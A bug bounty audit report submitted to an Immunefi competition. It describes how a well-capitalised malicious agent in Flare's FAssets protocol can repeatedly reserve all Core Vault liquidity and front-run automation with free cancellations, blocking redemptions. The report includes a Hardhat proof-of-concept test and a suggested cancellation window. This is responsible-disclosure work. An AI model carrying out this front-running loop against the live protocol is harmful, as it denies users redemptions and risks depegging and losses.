# #46993 \[SC-Low] Malicious agent with large capital can abuse \`cancelReturnFromCoreVault\` to block access to core vault liquidity during high redemption demand

**Submitted on Jun 7th 2025 at 13:16:15 UTC by @nnez for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #46993
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/library/CoreVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Vulnerability Details

The issue lies in the mechanism that allows agents to request underlying assets from the core vault via `requestReturnFromCoreVault`. This function is intended to let agents with sufficient collateral pull assets from the vault to meet user redemption demand and earn a portion of the redemption fee.

See: <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/library/CoreVault.sol#L125-L157>

```solidity
function requestReturnFromCoreVault(
    Agent.State storage _agent,
    uint64 _lots
)
    internal
    onlyEnabled
```

The function performs the following validations:

* The agent is in normal status and not already executing a return.
* The agent has enough free collateral to cover the requested lots.
* The requested amount is available in the core vault.
* The amount is recorded as reserved collateral, reducing the agent’s free balance.

However, two key properties open the system to abuse:

* There is **no fee** for placing a return request.
* The request can be **canceled freely** at any time before execution via `cancelReturnFromCoreVault`.

See: <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/library/CoreVault.sol#L159-L171>

```solidity
function cancelReturnFromCoreVault(
    Agent.State storage _agent
)
    internal
    onlyEnabled
```

### Attack scenario

This creates a denial-of-service vector during periods of high redemption pressure. A malicious agent with large capital can exploit this as follows:

1. Malicious agents deposit a large amount of collateral and invoke `requestReturnFromCoreVault`, reserving **all** underlying assets in the Core Vault.
2. Other agents are now blocked from accessing Core Vault funds to fulfill redemptions.
3. Before the automation (`triggerInstructions`) processes the transfer, the attacker **front-runs** it with `cancelReturnFromCoreVault`, freeing the reservation without penalty.
4. Immediately after automation clears pending requests, the attacker **back-runs** with new reservation requests, reclaiming full control of the vault’s available assets.
5. This loop can be **repeated indefinitely**.

Since the reserved amount is **excluded from the available pool** and there is **no penalty or fee** for making or canceling requests, attackers face no cost to continuously block access to Core Vault liquidity.

See: <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/library/CoreVault.sol#L272>

In a system where 85% of minted fAssets are backed by assets in the Core Vault and only 15% are held by agents directly:

* Only 15% of fAssets can be redeemed without vault access.
* If malicious agents block all return requests, honest agents cannot fulfill redemptions.
* Users are forced to sell fAssets on the secondary market at a discount due to redemption unavailability.

This creates a liquidity crunch that impacts the price of the fAsset and can lead to **protocol insolvency**.

## Impact

This vulnerability allows malicious agents to execute a **denial-of-service attack** on Core Vault withdrawals, effectively **locking out all other agents** from accessing the liquidity necessary for redemptions. In high-demand situations, this attack can prevent users from redeeming fAssets, leading to **system-wide redemption failure**, **depegging**, and ultimately **protocol insolvency**.

## Rationale for severity

Impact: protocol insolvency (effectively) because normal redemption process is disrupted.\
Severity: high because only malicious agent can perform the attack.

## Recommended Mitigations.

* Introduce a cancellation window, outside of this period, the cancellation should be disallowed.

## Proof of Concept

## Proof-of-Concept

The following test demonstrates that malicious agent with sufficient capital can effectively prevent other agents (or whitelisted users) from accessing liquidity in core vault.

### Steps

1. Add the following test in `test/integration/fasset-simulation/14-CoreVault.ts`.

```typescript
    it("nnez - request return and frontrun triggerInstructions with cancel", async () => {
        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
        const agent2 = await Agent.createTest(context, agentOwner2, underlyingAgent2);
        const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(1000000));
        await prefundCoreVault(minter.underlyingAddress, 1e6);
        // allow CV manager addresses
        await coreVaultManager.addAllowedDestinationAddresses([agent.underlyingAddress, agent2.underlyingAddress], { from: governance });
        // make agent available
        await agent.depositCollateralLotsAndMakeAvailable(100);
        await agent2.depositCollateralLotsAndMakeAvailable(10000);
        // mint
        const [minted] = await minter.performMinting(agent.vaultAddress, 10);
        // agent requests transfer for some backing to core vault
        const transferAmount = context.lotSize().muln(7);
        await agent.transferToCoreVault(transferAmount);
        // second agent requests return from CV
        const rres = await context.assetManager.requestReturnFromCoreVault(agent2.vaultAddress, 7, { from: agent2.ownerWorkAddress });
        const returnReq = requiredEventArgs(rres, "ReturnFromCoreVaultRequested");

        // first agent try to request underlying asset from core vault to fulfil redemption demand. 
        // but fail due to insufficient amount
        await expectRevert(context.assetManager.requestReturnFromCoreVault(agent.vaultAddress, 1, {from: agent.ownerWorkAddress}), "not enough available on core vault");
        
        // second agent monitors mempool and catch triggerInstructions tx. 
        // frontrunning with cancellation  
        const cres = await context.assetManager.cancelReturnFromCoreVault(agent2.vaultAddress, { from: agent2.ownerWorkAddress });
        
        // trigger CV requests
        // nothing is triggered
        const trigRes = await coreVaultManager.triggerInstructions({ from: triggeringAccount });
        const paymentReqs = filterEvents(trigRes, "PaymentInstructions");
        assert.equal(paymentReqs.length, 0);
        
        // second agent can repeat the attack again
        await context.assetManager.requestReturnFromCoreVault(agent2.vaultAddress, 7, { from: agent2.ownerWorkAddress });
        await expectRevert(context.assetManager.requestReturnFromCoreVault(agent.vaultAddress, 1, {from: agent.ownerWorkAddress}), "not enough available on core vault");
        
    });
```

2. Run `yarn test hardhat test/integration/fasset-simulation/14-CoreVault.ts --grep "nnez - request return and frontrun triggerInstructions with cancel"`
